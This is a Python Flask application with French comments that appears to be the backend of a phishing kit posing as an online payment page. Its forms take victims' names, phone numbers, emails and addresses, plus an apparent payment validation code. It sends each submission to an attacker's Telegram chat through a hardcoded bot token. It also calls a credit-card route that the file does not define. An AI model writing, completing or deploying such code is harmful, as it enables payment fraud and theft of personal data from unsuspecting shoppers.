from flask import Flask, request, render_template, redirect, url_for, session, jsonify
import requests

app = Flask(__name__)
app.secret_key = "supersecretkey"  # Nécessaire pour utiliser `session`

# Fonction pour envoyer un message Telegram
def send_telegram_message(message):
    bot_token = "8022971997:AAGj1VGrYKEXWdX6GaHIzT8nsomWYoJt8mA"  # Ton token Telegram
    chat_id = "5652184847"  # Ton ID Telegram

    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    payload = {"chat_id": chat_id, "text": message}

    response = requests.post(url, json=payload)

    if response.status_code == 200:
        print("✅ Message envoyé avec succès sur Telegram !")
    else:
        print(f"❌ Erreur lors de l'envoi du message : {response.text}")

# Route pour la page d'accueil (formulaire paiement)
@app.route('/', methods=['GET', 'POST'])
def payment_form():
    if request.method == 'POST':
        # Récupération des données du formulaire
        session['nom'] = request.form.get('nom', '').strip()
        session['prenom'] = request.form.get('prenom', '').strip()
        session['telephone'] = request.form.get('telephone', '').strip()
        session['email'] = request.form.get('email', '').strip()
        session['adresse_facturation'] = request.form.get('adresse_facturation', '').strip()
        session['adresse_livraison'] = request.form.get('adresse_livraison', '').strip()

        if not all([session['nom'], session['prenom'], session['telephone'], session['email'], session['adresse_facturation'], session['adresse_livraison']]):
            return "❌ Erreur : Tous les champs sont obligatoires.", 400

        # Envoyer un message Telegram avec les infos du formulaire
        message = f"""
        🔔 Nouvelle soumission de formulaire :
        - 🏷 Nom : {session['nom']}
        - 🏷 Prénom : {session['prenom']}
        - 📞 Téléphone : {session['telephone']}
        - 📧 E-mail : {session['email']}
        - 🏠 Adresse de facturation : {session['adresse_facturation']}
        - 🏠 Adresse de livraison : {session['adresse_livraison']}
        """
        send_telegram_message(message)

        return redirect(url_for('credit_card_form'))
    
    return render_template('paiement.html')

# Route pour la validation de commande
@app.route('/validation', methods=['GET', 'POST'])
def validation_paiement():
    if request.method == 'POST':
        validation_code = request.form.get('validation_code')

        if not validation_code:
            return "❌ Erreur : Le code de validation est obligatoire.", 400

        # Envoyer un message Telegram avec le code de validation
        message = f"""
        🔑 Code de validation reçu :
        - 🏷 Nom : {session.get('nom')}
        - 🔢 Code de validation : {validation_code}
        """
        send_telegram_message(message)

        return redirect(url_for('payment_confirmation'))

    return render_template('validationcommande.html')

# Route pour la page de confirmation de paiement
@app.route('/confirmation')
def payment_confirmation():
    return render_template('confirmation.html', nom=session.get('nom'), prenom=session.get('prenom'))

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5005)
